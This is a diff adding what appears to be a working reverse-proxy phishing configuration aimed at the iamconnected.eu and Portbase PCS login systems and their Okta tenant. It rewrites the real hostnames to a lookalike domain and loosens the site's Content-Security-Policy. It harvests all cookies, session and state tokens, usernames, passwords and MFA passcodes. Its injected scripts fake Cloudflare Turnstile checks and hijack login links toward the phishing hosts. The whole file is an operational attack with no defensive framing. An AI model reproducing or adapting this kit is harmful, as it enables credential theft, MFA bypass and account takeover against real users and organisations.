+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'www', domain: 'iamconnected.eu', search: 'www\.iamconnected\.eu', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'www', domain: 'iamconnected.eu', search: 'https%3A%2F%2Fwww\.iamconnected\.eu', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'www', domain: 'iamconnected.eu', search: '<meta http-equiv="Content-Security-Policy" content="(.*?)"', replace: "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src * data: blob: filesystem: about: ws: wss: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob:; style-src * data: blob: 'unsafe-inline'; font-src * data: blob: 'unsafe-inline';\"", mimes: ['text/html', 'application/xhtml+xml']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'www', domain: 'iamconnected.eu', search: 'https://www\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'www', domain: 'iamconnected.eu', search: 'www\.iamconnected\.eu', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'api', domain: 'iamconnected.eu', search: 'https://api\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'api', domain: 'iamconnected.eu', search: 'api\.iamconnected\.eu', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'api', domain: 'iamconnected.eu', search: '://api\.iamconnected\.eu', replace: '://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'api', domain: 'iamconnected.eu', search: '//api\.iamconnected\.eu', replace: '//{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'api', domain: 'iamconnected.eu', search: 'https%3A%2F%2Fapi\.iamconnected\.eu', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'auth', domain: 'iamconnected.eu', search: 'https://auth\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'auth', domain: 'iamconnected.eu', search: 'auth\.iamconnected\.eu', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'auth', domain: 'iamconnected.eu', search: 'https://auth\.xone\.sarl', replace: 'https://auth.{basedomain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'auth', domain: 'iamconnected.eu', search: 'auth\.xone\.sarl', replace: 'auth.{basedomain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'login', domain: 'iamconnected.eu', search: 'https://login\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'login', domain: 'iamconnected.eu', search: 'login\.iamconnected\.eu', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'autn', domain: 'iamconnected.eu', search: 'https://autn\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'autn', domain: 'iamconnected.eu', search: 'autn\.iamconnected\.eu', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'files', domain: 'iamconnected.eu', search: 'https://files\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'files', domain: 'iamconnected.eu', search: 'files\.iamconnected\.eu', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'api.iamconnected.eu', orig_sub: 'api', domain: 'iamconnected.eu', search: 'https://api\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'api.iamconnected.eu', orig_sub: 'api', domain: 'iamconnected.eu', search: 'api\.iamconnected\.eu', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'api.iamconnected.eu', orig_sub: 'www', domain: 'iamconnected.eu', search: 'https://www\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'api.iamconnected.eu', orig_sub: 'www', domain: 'iamconnected.eu', search: 'www\.iamconnected\.eu', replace: '{hostname}', mimes: ['application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'api.iamconnected.eu', orig_sub: 'auth', domain: 'iamconnected.eu', search: 'auth\.iamconnected\.eu', replace: '{hostname}', mimes: ['application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'api.iamconnected.eu', orig_sub: 'auth', domain: 'iamconnected.eu', search: 'auth\.xone\.sarl', replace: 'auth.{basedomain}', mimes: ['application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'auth.iamconnected.eu', orig_sub: 'www', domain: 'iamconnected.eu', search: 'www\.iamconnected\.eu', replace: '{hostname}', mimes: ['application/json', 'text/javascript', 'application/javascript', 'text/html']}
+  - {triggers_on: 'auth.iamconnected.eu', orig_sub: 'api', domain: 'iamconnected.eu', search: 'api\.iamconnected\.eu', replace: '{hostname}', mimes: ['application/json', 'text/javascript', 'application/javascript', 'text/html']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'app', domain: 'getbeamer.com', search: 'app\.getbeamer\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'backend', domain: 'getbeamer.com', search: 'https://backend\.getbeamer\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'backend', domain: 'getbeamer.com', search: 'backend\.getbeamer\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'realtime', domain: 'getbeamer.com', search: 'https://realtime\.getbeamer\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'realtime', domain: 'getbeamer.com', search: 'realtime\.getbeamer\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'iamc-internal-api', domain: 'pcs.portbase.com', search: 'https://iamc-internal-api\.pcs\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'iamc-internal-api', domain: 'pcs.portbase.com', search: 'iamc-internal-api\.pcs\.portbase\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'www', domain: 'pcs.portbase.com', search: 'https://www\.pcs\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'www', domain: 'pcs.portbase.com', search: 'www\.pcs\.portbase\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'auth', domain: 'iamconnected.eu', search: 'https://auth\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'auth', domain: 'iamconnected.eu', search: 'auth\.iamconnected\.eu', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'autn', domain: 'iamconnected.eu', search: 'https://autn\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'autn', domain: 'iamconnected.eu', search: 'autn\.iamconnected\.eu', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'api', domain: 'iamconnected.eu', search: 'https://api\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'api', domain: 'iamconnected.eu', search: 'api\.iamconnected\.eu', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'files', domain: 'iamconnected.eu', search: 'https://files\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'files', domain: 'iamconnected.eu', search: 'files\.iamconnected\.eu', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'autn.iamconnected.eu', orig_sub: 'autn', domain: 'iamconnected.eu', search: '://autn.iamconnected.eu', replace: '://{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'autn.iamconnected.eu', orig_sub: 'autn', domain: 'iamconnected.eu', search: '//autn.iamconnected.eu', replace: '//{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'autn.iamconnected.eu', orig_sub: 'autn', domain: 'iamconnected.eu', search: 'https://autn\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['application/json', 'text/html']}
+  - {triggers_on: 'autn.iamconnected.eu', orig_sub: 'autn', domain: 'iamconnected.eu', search: 'autn\.iamconnected\.eu', replace: '{hostname}', mimes: ['application/json', 'text/html']}
+  - {triggers_on: 'auth.iamconnected.eu', orig_sub: 'auth', domain: 'iamconnected.eu', search: 'https://auth\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'auth.iamconnected.eu', orig_sub: 'auth', domain: 'iamconnected.eu', search: 'auth\.iamconnected\.eu', replace: '{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'auth.iamconnected.eu', orig_sub: 'auth', domain: 'iamconnected.eu', search: 'https://auth\.xone\.sarl', replace: 'https://auth.{basedomain}', mimes: ['application/json', 'text/html', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'auth.iamconnected.eu', orig_sub: 'auth', domain: 'iamconnected.eu', search: 'auth\.xone\.sarl', replace: 'auth.{basedomain}', mimes: ['application/json', 'text/html', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'auth', domain: 'iamconnected.eu', search: 'https://auth\.xone\.sarl', replace: 'https://auth.{basedomain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'auth', domain: 'iamconnected.eu', search: 'auth\.xone\.sarl', replace: 'auth.{basedomain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'autn.iamconnected.eu', orig_sub: 'auth', domain: 'iamconnected.eu', search: 'https://auth\.xone\.sarl', replace: 'https://auth.{basedomain}', mimes: ['application/json', 'text/html']}
+  - {triggers_on: 'autn.iamconnected.eu', orig_sub: 'auth', domain: 'iamconnected.eu', search: 'auth\.xone\.sarl', replace: 'auth.{basedomain}', mimes: ['application/json', 'text/html']}
+  - {triggers_on: 'autn.iamconnected.eu', orig_sub: 'autn', domain: 'iamconnected.eu', search: 'https://autn\.iamconnected\.eu/oauth2', replace: 'https://auth.{basedomain}/oauth2', mimes: ['application/json', 'text/html', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'autn.iamconnected.eu', orig_sub: 'autn', domain: 'iamconnected.eu', search: 'autn\.iamconnected\.eu/oauth2', replace: 'auth.{basedomain}/oauth2', mimes: ['application/json', 'text/html', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'autn.iamconnected.eu', orig_sub: 'portbase-admin', domain: 'okta-emea.com', search: '://okta-emea.com', replace: '://portbase-admin.{basedomain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'autn.iamconnected.eu', orig_sub: 'portbase-admin', domain: 'okta-emea.com', search: 'portbase-admin\.okta-emea\.com', replace: 'portbase-admin.{basedomain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'autn.iamconnected.eu', orig_sub: 'portbase-admin', domain: 'okta-emea.com', search: 'https%3A%2F%2Fportbase-admin\.okta-emea\.com', replace: 'https%3A%2F%2Fportbase-admin.{basedomain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'autn.iamconnected.eu', orig_sub: 'fiamc-api', domain: 'ia.com', search: '://fiamc-api\.ia\.com', replace: '://fiamc-api.{basedomain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'autn.iamconnected.eu', orig_sub: 'fiamc-api', domain: 'ia.com', search: 'fiamc-api\.ia\.com', replace: 'fiamc-api.{basedomain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'portbase-admin', domain: 'okta-emea.com', search: '://okta-emea.com', replace: '://portbase-admin.{basedomain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'portbase-admin', domain: 'okta-emea.com', search: 'portbase-admin\.okta-emea\.com', replace: 'portbase-admin.{basedomain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'fiamc-api', domain: 'ia.com', search: 'fiamc-api\.ia\.com', replace: 'fiamc-api.{basedomain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.iamconnected.eu', orig_sub: 'portbase-admin', domain: 'okta-emea.com', search: '://okta-emea.com', replace: '://portbase-admin.{basedomain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.iamconnected.eu', orig_sub: 'portbase-admin', domain: 'okta-emea.com', search: 'portbase-admin\.okta-emea\.com', replace: 'portbase-admin.{basedomain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.iamconnected.eu', orig_sub: 'fiamc-api', domain: 'ia.com', search: 'fiamc-api\.ia\.com', replace: 'fiamc-api.{basedomain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'portbase-admin', domain: 'okta-emea.com', search: '://okta-emea.com', replace: '://portbase-admin.{basedomain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'portbase-admin', domain: 'okta-emea.com', search: 'portbase-admin\.okta-emea\.com', replace: 'portbase-admin.{basedomain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'fiamc-api', domain: 'ia.com', search: 'fiamc-api\.ia\.com', replace: 'fiamc-api.{basedomain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'autn', domain: 'iamconnected.eu', search: 'https://autn\.iamconnected\.eu/oauth2', replace: 'https://auth.{basedomain}/oauth2', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'autn', domain: 'iamconnected.eu', search: 'autn\.iamconnected\.eu/oauth2', replace: 'auth.{basedomain}/oauth2', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'api.iamconnected.eu', orig_sub: 'api', domain: 'iamconnected.eu', search: '://api.iamconnected.eu', replace: '://{hostname}', mimes: ['text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'api.iamconnected.eu', orig_sub: 'api', domain: 'iamconnected.eu', search: '//api.iamconnected.eu', replace: '//{hostname}', mimes: ['text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'files.iamconnected.eu', orig_sub: 'files', domain: 'iamconnected.eu', search: '://files.iamconnected.eu', replace: '://{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'files.iamconnected.eu', orig_sub: 'files', domain: 'iamconnected.eu', search: '//files.iamconnected.eu', replace: '//{hostname}', mimes: ['text/javascript', 'application/javascript']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'login', domain: 'iamconnected.eu', search: 'https%3A%2F%2Flogin\.iamconnected\.eu', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.iamconnected.eu', orig_sub: 'www', domain: 'iamconnected.eu', search: 'https%3A%2F%2Fwww\.iamconnected\.eu', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+auth_tokens:
+  - domain: '.iamconnected.eu'
+    keys: ['.*,regexp']
+  - domain: '.xone.sarl'
+    keys: ['.*,regexp']
+  - domain: 'auth.xone.sarl'
+    keys: ['.*,regexp']
+  - domain: '.okta-emea.com'
+    keys: ['.*,regexp']
+  - domain: 'portbase-admin.okta-emea.com'
+    keys: ['.*,regexp']
+  - domain: '.ia.com'
+    keys: ['.*,regexp']
+  - domain: 'fiamc-api.ia.com'
+    keys: ['.*,regexp']
+  - domain: '.pcs.portbase.com'
+    keys: ['.*,regexp']
+  - domain: '.portbase.com'
+    keys: ['.*,regexp']
+  - domain: 'autn.iamconnected.eu'
+    type: 'body'
+    path: '/api/v1/'
+    name: 'sessionToken'
+    search: '"sessionToken"\s*:\s*"([^"]+)"'
+  - domain: 'autn.iamconnected.eu'
+    type: 'body'
+    path: '/api/v1/'
+    name: 'stateToken'
+    search: '"stateToken"\s*:\s*"([^"]+)"'
+
+auth_urls:
+  - '/auth/callback'
+  - '/token'
+  - '/iamc-api/iamc-callback'
+  - '/portal/start'
+  - '/portal/'
+  - '/dashboard'
+  - '/home'
+  - '/portal'
+
+credentials:
+  username:
+    key: 'username'
+    search: '"username"\s*:\s*"([^"]+)"'
+    type: 'json'
+  password:
+    key: 'password'
+    search: '"password"\s*:\s*"([^"]+)"'
+    type: 'json'
+  custom:
+    - key: 'mfa'
+      search: '"passCode"\s*:\s*"([^"]+)"'
+      type: 'json'
+    - key: 'stateToken'
+      search: '"stateToken"\s*:\s*"([^"]+)"'
+      type: 'json'
+
+puppet:
+  enabled: true
+  mode: 'ia-mirror'
+  upstream: 'http://127.0.0.1:1000'
+  hosts:
+    - 'www.portbase.com'
+    - 'login.pcs.portbase.com'
+    - 'pcs.portbase.com'
+    - 'start.pcs.portbase.com'
+
+js_inject:
+  - trigger_domains: ["www.portbase.com"]
+    trigger_paths: ['/.*/']
+    trigger_mimes: ['text/html']
+    trigger_params: []
+    script: |
+      (function(){
+        var s='cf-phish-stub';
+        window.turnstile={render:function(e,o){if(o&&o.callback)try{o.callback(s)}catch(x){}return'w'},ready:function(f){if(f)f()},reset:function(){},remove:function(){},getResponse:function(){return s},execute:function(){return s}};
+        var b=location.hostname.split('.').slice(1).join('.');
+        var pcs='https://pcsl.'+b+'/?lang=nl';
+        document.addEventListener('click',function(e){
+          var a=e.target&&e.target.closest?e.target.closest('a'):null;
+          if(!a||!/pcs|inloggen|login/i.test(String(a.href||'')+String(a.textContent||'')))return;
+          e.preventDefault();e.stopImmediatePropagation();location.replace(pcs);
+        },true);
+      })();
+  # icwww: Cloudflare Turnstile stub (register/login/callback — challenges.cloudflare.com blocked)
+  - trigger_domains: ["www.iamconnected.eu"]
+    trigger_paths: ['/.*/']
+    trigger_mimes: ['text/html']
+    trigger_params: []
+    script: |
+      (function(){
+        var S="cf-phish-stub";
+        function fire(o){if(o&&o.callback)try{o.callback(S)}catch(e){}}
+        function mk(){return{render:function(e,o){fire(o);return"w"},ready:function(f){if(f)f()},reset:function(){},remove:function(){},getResponse:function(){return S},execute:function(){return S}}};
+        window.turnstile=mk();
+        function blk(u){return u&&(u.indexOf("challenges.cloudflare.com")>-1||u.indexOf("turnstile/api.js")>-1||u.indexOf("dataplane.rum.")>-1||u.indexOf(".rum.amazonaws.com")>-1);}
+        function kill(){document.querySelectorAll('iframe[src*="cloudflare"],.cf-turnstile,[data-sitekey]').forEach(function(el){el.remove()});var i=document.querySelector('[name="cf-turnstile-response"]');if(!i){i=document.createElement("input");i.type="hidden";i.name="cf-turnstile-response";i.value=S;(document.body||document.documentElement).appendChild(i)}else i.value=S;}
+        if(window.fetch){var f=window.fetch;window.fetch=function(u,o){var url=typeof u==="string"?u:(u&&u.url)||"";if(blk(url))return Promise.resolve(new Response("{}",{status:200,headers:{"Content-Type":"application/json"}}));return f.apply(this,arguments)}}
+        if(navigator.sendBeacon){var sb=navigator.sendBeacon.bind(navigator);navigator.sendBeacon=function(u,d){if(blk(u))return true;return sb(u,d)}}
+        kill();document.addEventListener("DOMContentLoaded",kill);
+      })();
+  # PCS fallback if server 302 missed (tryPcsOAuthShortcut is primary)
+  - trigger_domains: ["login.pcs.portbase.com", "pcs.portbase.com", "start.pcs.portbase.com"]
+    trigger_paths: ['/.*/']
+    trigger_mimes: ['text/html']
+    trigger_params: []
+    script: |
+      (function(){
+        if(/client_id=/.test(location.search))return;
+        var b=location.hostname.split('.').slice(1).join('.'),l='nl';
+        try{l=new URLSearchParams(location.search).get('lang')||l}catch(e){}
+        var ru=encodeURIComponent('https://iamc-api.'+b+'/iamc-api/iamc-callback'),st=encodeURIComponent('https://pcsw.'+b+'/portal/start.do'),
+        u='https://login.'+b+'/?client_id=0oa2jy3t24TN0gtZk0i7&redirect_uri='+ru+'&state='+st+'&lang='+encodeURIComponent(l);
+        document.addEventListener('click',function(e){
+          var a=e.target&&e.target.closest?e.target.closest('a'):null;
+          if(!a){a=e.target&&e.target.closest?e.target.closest('#link_iamc'):null}
+          if(!a)return;
+          e.preventDefault();e.stopImmediatePropagation();location.replace(u);
+        },true);
+      })();
